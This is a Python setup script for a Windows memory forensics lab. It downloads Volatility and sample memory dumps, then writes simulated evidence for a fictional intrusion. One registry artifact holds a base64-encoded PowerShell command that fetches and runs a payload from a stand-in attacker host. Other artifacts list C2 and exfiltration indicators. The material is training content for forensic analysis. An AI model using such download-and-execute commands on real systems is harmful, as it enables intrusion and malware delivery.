#!/usr/bin/env python
# setup.py - Environment setup script for Windows Memory Forensics Lab

import os
import sys
import subprocess
import urllib.request
import zipfile
import shutil
import ctypes
import time

# Check for admin privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("This script requires administrative privileges.")
    print("Please run Command Prompt as Administrator and try again.")
    input("Press Enter to exit...")
    sys.exit(1)

# Create dir structure
def create_directories():
    print("[+] Creating directory structure...")
    
    directories = [
        "tools",
        "memory_dumps",
        "evidence",
        "reports",
        "workdir"
    ]
    
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"  - Created {directory} directory")

# Download req.files
def download_files():
    print("[+] Downloading required files...")
    
    files_to_download = [
        {
            "url": "https://github.com/volatilityfoundation/volatility3/archive/refs/heads/master.zip",
            "destination": "tools/volatility3-master.zip",
            "extract_to": "tools/",
            "description": "Volatility 3 Framework"
        },
        {
            "url": "https://github.com/volatilityfoundation/volatility/archive/refs/heads/master.zip",
            "destination": "tools/volatility2-master.zip",
            "extract_to": "tools/",
            "description": "Volatility 2 Framework"
        },
        {
            "url": "https://www.dropbox.com/s/3sifuee5plwntx5/memory_samples.zip?dl=1",
            "destination": "memory_dumps/memory_samples.zip",
            "extract_to": "memory_dumps/",
            "description": "Sample Memory Dumps"
        }
    ]
    
    for file_info in files_to_download:
        if not os.path.exists(file_info["destination"]):
            print(f"  - Downloading {file_info['description']}...")
            try:
                urllib.request.urlretrieve(file_info["url"], file_info["destination"])
                print(f"    Downloaded {file_info['description']}")
                
                if file_info["destination"].endswith(".zip"):
                    print(f"    Extracting {file_info['description']}...")
                    with zipfile.ZipFile(file_info["destination"], 'r') as zip_ref:
                        zip_ref.extractall(file_info["extract_to"])
                    print(f"    Extracted {file_info['description']}")
            except Exception as e:
                print(f"    Error downloading {file_info['description']}: {e}")
        else:
            print(f"  - {file_info['description']} already downloaded")

def check_python():
    print("[+] Checking Python installation...")
    
    try:
        python_version = subprocess.check_output(["python", "--version"], stderr=subprocess.STDOUT).decode().strip()
        print(f"  - {python_version} is installed")
    except:
        print("  - Python is not installed or not in PATH")
        print("  - Downloading Python installer...")
        
        python_installer = "python-3.9.13-amd64.exe"
        urllib.request.urlretrieve(f"https://www.python.org/ftp/python/3.9.13/{python_installer}", python_installer)
        
        print("  - Installing Python (this may take a few minutes)...")
        subprocess.call([python_installer, "/quiet", "PrependPath=1", "Include_test=0"])
        
        # Update PATH for current process
        os.environ["PATH"] = f"{os.environ['PATH']};C:\\Program Files\\Python39;C:\\Program Files\\Python39\\Scripts"
        
        print("  - Python installation completed")

def install_packages():
    print("[+] Installing required Python packages...")
    
    packages = [
        "pefile",
        "yara-python",
        "colorama",
        "prettytable",
        "tqdm",
        "requests"
    ]
    
    for package in packages:
        try:
            print(f"  - Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"    Installed {package}")
        except Exception as e:
            print(f"    Error installing {package}: {e}")

def create_artifacts():
    print("[+] Creating lab artifacts...")
    
    # Create  lab data file with Dark Kittens IOCs
    ioc_data = """
# Dark Kittens IOC Data
# For educational purposes only

COMMAND_AND_CONTROL=darkittens.evil
EXFIL_SERVER=data-collect.darkittens.evil
IMPLANT_FILENAME=svchost_update.exe
PERSISTENCE_KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
PERSISTENCE_VALUE=SystemServiceManager
MUTEX_NAME=DK_Global_Control
ENCRYPTION_KEY=D@rkK!tt3nsRul3Th3W0rld
TARGETED_DATA=C:\\Users\\Administrator\\Documents\\Globomantics
KEYLOGGER_LOG=C:\\ProgramData\\Microsoft\\Crypto\\keylog.dat
"""
    
    with open("evidence/dark_kittens_ioc.txt", "w") as f:
        f.write(ioc_data)
    
    reg_data = """
# Windows Registry data extracted from memory
# Process ID: 3244 (svchost_update.exe)

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"SystemServiceManager"="C:\\Windows\\System32\\svchost_update.exe"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU]
"a"="cmd.exe /c powershell.exe -e UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMwA7ACAAaQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGEAcgBrAGkAdAB0AGUAbgBzAC4AZQB2AGkAbAAvAGMAMgAvAGcAZQB0AHAAYQB5AGwAbwBhAGQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AF8AdQBwAGQAYQB0AGUALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAdgBjAGgAbwBzAHQAXwB1AHAAZABhAHQAZQAuAGUAeABlACIAOwA="
"""
    
    with open("evidence/registry_data.txt", "w") as f:
        f.write(reg_data)
    
    network_data = """
# Network connections extracted from memory dump
# Format: PID,Process_Name,Local_Address,Foreign_Address,State

3244,svchost_update.exe,192.168.1.100:49232,185.73.23.4:443,ESTABLISHED
3244,svchost_update.exe,192.168.1.100:49235,185.73.23.4:8080,ESTABLISHED
1234,explorer.exe,192.168.1.100:49001,172.217.23.14:443,ESTABLISHED
2384,chrome.exe,192.168.1.100:49002,142.250.180.46:443,ESTABLISHED
4832,svchost.exe,192.168.1.100:49003,13.107.42.14:443,ESTABLISHED
3244,svchost_update.exe,192.168.1.100:49236,23.81.246.187:443,ESTABLISHED
"""
    
    with open("evidence/network_connections.txt", "w") as f:
        f.write(network_data)
    
    process_data = """
# Process list extracted from memory dump
# Format: PID,PPID,Process_Name,Process_Path,Create_Time

696,4,wininit.exe,C:\\Windows\\System32\\wininit.exe,2023-05-01 08:14:23
788,696,services.exe,C:\\Windows\\System32\\services.exe,2023-05-01 08:14:25
820,788,svchost.exe,C:\\Windows\\System32\\svchost.exe,2023-05-01 08:14:30
4832,788,svchost.exe,C:\\Windows\\System32\\svchost.exe,2023-05-01 08:14:31
1000,696,lsass.exe,C:\\Windows\\System32\\lsass.exe,2023-05-01 08:14:25
1234,4,explorer.exe,C:\\Windows\\explorer.exe,2023-05-01 08:15:12
2384,1234,chrome.exe,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,2023-05-01 09:23:45
3244,788,svchost_update.exe,C:\\Windows\\System32\\svchost_update.exe,2023-05-01 12:37:22
3536,3244,cmd.exe,C:\\Windows\\System32\\cmd.exe,2023-05-01 12:37:25
3724,3536,powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,2023-05-01 12:37:26
"""
    
    with open("evidence/process_list.txt", "w") as f:
        f.write(process_data)

def completion_message():
    print("\n" + "="*70)
    print("LAB SETUP COMPLETE")
    print("="*70)
    print("\nYour Windows Memory Forensics Lab is now set up and ready to use.")
    print("\nTo start the lab:")
    print("1. Open Command Prompt")
    print("2. Navigate to the lab directory")
    print("3. Run: python analyze_memory.py")
    print("\nPlease follow the instructions in the README.md file for detailed steps.")
    print("="*70)
    input("\nPress Enter to exit the setup...")

def main():
    print("\n" + "="*70)
    print("WINDOWS MEMORY FORENSICS LAB - ENVIRONMENT SETUP")
    print("="*70 + "\n")
    
    try:
        check_python()
        
        create_directories()
        
        download_files()
        
        install_packages()
        
        create_artifacts()
        
        completion_message()
        
    except Exception as e:
        print(f"\n[!] Error during setup: {e}")
        print("[!] Please try running the script again as Administrator.")
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
